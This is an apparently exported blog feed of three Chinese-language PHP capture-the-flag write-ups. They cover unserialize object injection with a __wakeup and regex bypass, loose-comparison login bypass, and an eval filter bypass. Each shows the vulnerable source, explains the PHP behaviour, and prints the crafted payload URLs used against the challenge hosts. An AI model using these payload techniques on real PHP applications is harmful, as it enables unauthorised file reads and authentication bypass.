{
    "version": "https://jsonfeed.org/version/1",
    "title": "人生几何 • All posts by \"ctf\" category",
    "description": "",
    "home_page_url": "https://RenshengJi.github.io",
    "items": [
        {
            "id": "https://renshengji.github.io/2023/07/17/ctf-3/",
            "url": "https://renshengji.github.io/2023/07/17/ctf-3/",
            "title": "一道ctf小题（3）",
            "date_published": "2023-07-17T05:19:03.000Z",
            "content_html": "<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><div class=\"highlight-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> </span>&#123; </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$file</span> = <span class=\"string\">&#x27;index.php&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$file</span></span>) </span>&#123; </span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;file = <span class=\"variable\">$file</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> @<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"variable\">$this</span>-&gt;file, <span class=\"literal\">true</span>); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;file != <span class=\"string\">&#x27;index.php&#x27;</span>) &#123; </span><br><span class=\"line\">            <span class=\"comment\">//the secret is in the fl4g.php</span></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;file = <span class=\"string\">&#x27;index.php&#x27;</span>; </span><br><span class=\"line\">        &#125; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;var&#x27;</span>])) &#123; </span><br><span class=\"line\">    <span class=\"variable\">$var</span> = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;var&#x27;</span>]); </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/[oc]:\\d+:/i&#x27;</span>, <span class=\"variable\">$var</span>)) &#123; </span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;stop hacking!&#x27;</span>); </span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        @<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$var</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&quot;index.php&quot;</span>); </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></div>\n\n<h3 id=\"前置知识点\"><a href=\"#前置知识点\" class=\"headerlink\" title=\"前置知识点\"></a>前置知识点</h3><ul>\n<li><p>__construct($file$)：构造函数，接受一个参数 $file$，用于设置私有属性 $file 的值。</p>\n</li>\n<li><p>__destruct()：析构函数，当该对象被销毁时，将调用此方法。该方法使用 PHP 内置函数 highlight_file() 对 $file 文件进行语法高亮，并将结果输出到标准输出流中。需要注意的是，在输出前使用了 @ 符号，表示忽略任何错误或警告信息。</p>\n</li>\n<li><p>__wakeup()：反序列化函数，当从字符串中反序列化一个对象时，将自动调用此方法。该方法检查私有属性 file 的值是否等于 ‘index.php’，如果不是，则将其设置为 ‘index.php’。需要注意的是，如果使用 unserialize() 函数对该对象进行反序列化，并且 $file 属性的值不等于 ‘index.php’，则执行 wakeup() 方法时，将会输出注释中提到的密钥。</p>\n</li>\n<li><p>preg_match(‘&#x2F;[oc]:\\d+:&#x2F;i’, $var)是一个正则表达式，匹配以下内容，因此，若var中出现类似于 “o:1:”、”C:2:”、”o:123:” 等格式的字符串后，将die</p>\n<ul>\n<li>[oc]：字符集，表示匹配字符 o 或 c。</li>\n<li>:：匹配冒号字符。</li>\n<li>\\d+：匹配一个或多个数字字符。</li>\n<li>:：匹配冒号字符。</li>\n<li>&#x2F;i：表示忽略大小写。</li>\n</ul>\n</li>\n<li><p><strong>[解题关键]<strong>在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本存在wakeup的</strong>漏洞</strong>。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过。</p>\n</li>\n<li><p>PHP 序列化后的各种数据类型都是用以下字符表示的：</p>\n<ul>\n<li>整型：以 “i:” 开头，后面跟着一个整数和一个分号，例如 “i:123;”</li>\n<li>浮点型：以 “d:” 开头，后面跟着一个浮点数和一个分号，例如 “d:3.14;”</li>\n<li>字符串：以 “s:” 开头，后面跟着一个整数表示字符串长度、一个冒号、字符串内容和一个分号，例如 “s:5:”hello”;”</li>\n<li>数组：以 “a:” 开头，后面跟着一个整数表示数组元素个数、一个冒号、每个元素的序列化结果和一个分号，例如 “a:3:{i:0;s:3:”foo”;i:1;s:3:”bar”;i:2;s:3:”baz”;}”</li>\n<li>对象：以 “O:” 开头，后面跟着类名、一个冒号、属性个数、一个冒号、每个属性的名称和值的序列化结果和一个分号，例如 “O:8:”stdClass”:2:{s:3:”foo”;i:123;s:3:”bar”;s:5:”hello”;}”</li>\n<li>布尔型：以 “b:” 开头，后面跟着 0 或 1 和一个分号，例如 “b:1;”</li>\n<li>空值：以 “N;” 表示，例如 “N;”</li>\n<li>对象引用：以 “r:” 开头，后面跟着一个整数表示对象在当前序列化数据中的引用索引和一个分号，例如 “r:1;”</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"解题思路\"><a href=\"#解题思路\" class=\"headerlink\" title=\"解题思路\"></a>解题思路</h3><ul>\n<li>类元素数据类型不能为o和c，o是对象，但是不慌，我们可以利用**”O:+4:”**进行绕过</li>\n<li>为了绕过wakeup函数，我们可以将:1:换为:2:</li>\n</ul>\n<h3 id=\"payload\"><a href=\"#payload\" class=\"headerlink\" title=\"payload\"></a>payload</h3><div class=\"highlight-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> </span>&#123;</span><br><span class=\"line\"> <span class=\"keyword\">private</span> <span class=\"variable\">$file</span> = <span class=\"string\">&#x27;index.php&#x27;</span>;</span><br><span class=\"line\"> <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$file</span></span>) </span>&#123;</span><br><span class=\"line\"> <span class=\"variable language_\">$this</span>-&gt;file = <span class=\"variable\">$file</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"> <span class=\"keyword\">echo</span> @<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"variable\">$this</span>-&gt;file, <span class=\"literal\">true</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;file != <span class=\"string\">&#x27;index.php&#x27;</span>) &#123;</span><br><span class=\"line\"> <span class=\"comment\">//the secret is in the fl4g.php</span></span><br><span class=\"line\"> <span class=\"variable language_\">$this</span>-&gt;file = <span class=\"string\">&#x27;index.php&#x27;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$flag</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Demo</span>(<span class=\"string\">&#x27;fl4g.php&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable\">$flag</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$flag</span>);</span><br><span class=\"line\"><span class=\"variable\">$flag</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;O:4&#x27;</span>, <span class=\"string\">&#x27;O:+4&#x27;</span>,<span class=\"variable\">$flag</span>); <span class=\"comment\">// 绕过正则</span></span><br><span class=\"line\"><span class=\"variable\">$flag</span> = <span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&#x27;:1:&#x27;</span>, <span class=\"string\">&#x27;:2:&#x27;</span> ,<span class=\"variable\">$flag</span>); <span class=\"comment\">//绕过wakeup 函数</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$flag</span>); <span class=\"comment\">//对参数进行 base 编码</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure></div>\n\n<p><a class=\"link\"   href=\"http://61.147.171.105:58335/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==\" >http://61.147.171.105:58335/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ== <i class=\"fa-regular fa-arrow-up-right-from-square fa-sm\"></i></a></p>\n<p>得到flag</p>\n<div class=\"highlight-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$flag</span>=<span class=\"string\">&quot;ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></div>",
            "tags": [
                "php"
            ]
        },
        {
            "id": "https://renshengji.github.io/2023/03/25/ctf-2/",
            "url": "https://renshengji.github.io/2023/03/25/ctf-2/",
            "title": "一道ctf小题（2）",
            "date_published": "2023-03-25T03:28:03.000Z",
            "content_html": "<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>直接上源码：</p>\n<div class=\"highlight-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$username</span>  = <span class=\"string\">&quot;this_is_secret&quot;</span>; </span><br><span class=\"line\"><span class=\"variable\">$password</span>  = <span class=\"string\">&quot;this_is_not_known_to_you&quot;</span>; </span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag.php&quot;</span>);<span class=\"comment\">//here I changed those two </span></span><br><span class=\"line\"><span class=\"variable\">$info</span> = <span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;info&#x27;</span>])? <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;info&#x27;</span>]: <span class=\"string\">&quot;&quot;</span> ;</span><br><span class=\"line\"><span class=\"variable\">$data_unserialize</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$info</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$data_unserialize</span>[<span class=\"string\">&#x27;username&#x27;</span>]==<span class=\"variable\">$username</span>&amp;&amp;<span class=\"variable\">$data_unserialize</span>[<span class=\"string\">&#x27;password&#x27;</span>]==<span class=\"variable\">$password</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;username or password error!&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></div>\n\n<h2 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h2><h3 id=\"反序列化\"><a href=\"#反序列化\" class=\"headerlink\" title=\"反序列化\"></a>反序列化</h3><ul>\n<li>serialize()函数用于序列化对象或数组，并返回一个字符串。</li>\n<li>函数序列化对象后，可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。</li>\n<li>例子： <div class=\"highlight-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"variable\">$a</span> = [</span><br><span class=\"line\"><span class=\"string\">&#x27;username&#x27;</span> =&gt; <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;password&#x27;</span> =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">];</span><br><span class=\"line\"><span class=\"variable\">$info</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$info</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\"># a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure></div></li>\n<li>unserialize()函数就是将序列化后的字符串反序列化成数组的过程</li>\n</ul>\n<h3 id=\"弱比较\"><a href=\"#弱比较\" class=\"headerlink\" title=\"弱比较\"></a>弱比较</h3><ul>\n<li>这里要知道一个关于弱比较的特性：布尔类型True与非零非NULL变量比较都会是True。</li>\n</ul>\n<h2 id=\"题目解决\"><a href=\"#题目解决\" class=\"headerlink\" title=\"题目解决\"></a>题目解决</h2><ul>\n<li><p>这个题有个非常坑的地方，你以为**include(“flag.php”);**只是将flag变量包含进来吗？</p>\n</li>\n<li><p>tnnd，这个文件里面把<strong>username</strong>和<strong>password</strong>都给改了！！！</p>\n</li>\n<li><p>所以呢，不能直接对原来那俩的值进行序列化，但是我们可以直接利用上面介绍的弱比较的特性</p>\n</li>\n<li><p>exp:</p>\n  <div class=\"highlight-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"variable\">$a</span> = [</span><br><span class=\"line\"><span class=\"string\">&#x27;username&#x27;</span> =&gt; <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&#x27;password&#x27;</span> =&gt; <span class=\"literal\">true</span></span><br><span class=\"line\">];</span><br><span class=\"line\"><span class=\"variable\">$info</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$info</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></div></li>\n<li><p>可以直接在<a class=\"link\"   href=\"https://www.w3cschool.cn/tryrun/runcode?lang=php\" >php在线 <i class=\"fa-regular fa-arrow-up-right-from-square fa-sm\"></i></a>这里进行php在线编辑</p>\n</li>\n<li><p>得到的结果：a:2:{s:8:”username”;b:1;s:8:”password”;b:1;}</p>\n</li>\n<li><p>pyload:</p>\n<div class=\"highlight-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://43.142.108.3:28005/?info=a:2:&#123;s:8:%22username%22;b:1;s:8:%22password%22;b:1;&#125;</span><br></pre></td></tr></table></figure></div></li>\n</ul>\n",
            "tags": [
                "php"
            ]
        },
        {
            "id": "https://renshengji.github.io/2023/03/05/ctf-1/",
            "url": "https://renshengji.github.io/2023/03/05/ctf-1/",
            "title": "一道ctf小题",
            "date_published": "2023-03-05T04:52:03.000Z",
            "content_html": "<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><p>直接上源码：</p>\n<div class=\"highlight-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$num</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/\\&#x27;|\\&quot;|\\`| |&lt;|&gt;|?|\\^|%|\\$/&quot;</span>, <span class=\"variable\">$num</span>)) &#123;</span><br><span class=\"line\">           <span class=\"keyword\">die</span>(<span class=\"string\">&quot;nononno&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">eval</span>(<span class=\"string\">&quot;return $&#123;num&#125; != 2;&quot;</span>) &amp;&amp; <span class=\"variable\">$num</span> == <span class=\"number\">0</span> &amp;&amp; <span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$num</span>) != <span class=\"literal\">true</span>) &#123;</span><br><span class=\"line\"> <span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;cat flag.php&#x27;</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"> <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;2&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></div>\n\n<p>分析：我们需要同时满足if表达式中的三个条件</p>\n<div class=\"highlight-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">&quot;return $&#123;num&#125; != 2;&quot;</span>) &amp;&amp; <span class=\"variable\">$num</span> == <span class=\"number\">0</span> &amp;&amp; <span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$num</span>) != <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure></div>\n\n<ul>\n<li><p>第二个条件：要求get到的num弱等于0</p>\n<ul>\n<li><p>弱等于比较时，会先将字符串转换为数字，其转换方式就是截取开头的数字，不过还有两种特殊情况如下：</p>\n<ul>\n<li><p>如果没有数字，即就是一个纯字符串的话，转化为0</p>\n</li>\n<li><p>如果这个字符串恰好是一个科学技术法的表达式，会将此字符串按科学技术法转换为数字</p>\n</li>\n</ul>\n</li>\n<li><p>示例代码如下：</p>\n</li>\n</ul>\n  <div class=\"highlight-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"string\">&quot;admin&quot;</span>==<span class=\"number\">0</span>);  <span class=\"comment\">//true</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"string\">&quot;1admin&quot;</span>==<span class=\"number\">1</span>); <span class=\"comment\">//true</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"string\">&quot;2admin&quot;</span>==<span class=\"number\">2</span>); <span class=\"comment\">//true</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"string\">&quot;ad1min&quot;</span>==<span class=\"number\">1</span>); <span class=\"comment\">//false</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"string\">&quot;admin1&quot;</span>==<span class=\"number\">1</span>); <span class=\"comment\">//false</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"string\">&quot;admin1&quot;</span>==<span class=\"number\">0</span>); <span class=\"comment\">//true</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"number\">0e1234</span> == <span class=\"number\">0e56789</span>); <span class=\"comment\">//true </span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></div>\n</li>\n<li><p>第三个条件：要求get到的num不是数字类型</p>\n<ul>\n<li>这个很好说，只要不是纯数字就可以了</li>\n</ul>\n</li>\n<li><p>第一个条件：让<code>$&#123;num&#125;!=2</code>返回1</p>\n<ul>\n<li><p>背景知识：</p>\n<ul>\n<li><p>eval()的返回值一般是<code>NULL</code>，除非执行的表达式是<code>return</code>，这种情况下，eval()的返回值就是return的值</p>\n</li>\n<li><p>php中的运算符优先级（跟Cpp基本一样哈）中比较运算的优先级大于双目位运算</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>根据条件3，我们输入的一定不是一个纯数字，所以要满足第一个条件的话，我们就必须考虑如php里面运算符的优先级和结合性，以便于能够成功输出</p>\n<ul>\n<li><p>方法一：<code>num=0|1</code></p>\n</li>\n<li><p>方法二：<code>num=0^0</code></p>\n</li>\n</ul>\n<p>…知道了思路，方案肯定是有非常多的，在此就不列举了</p>\n",
            "tags": [
                "php"
            ]
        }
    ]
}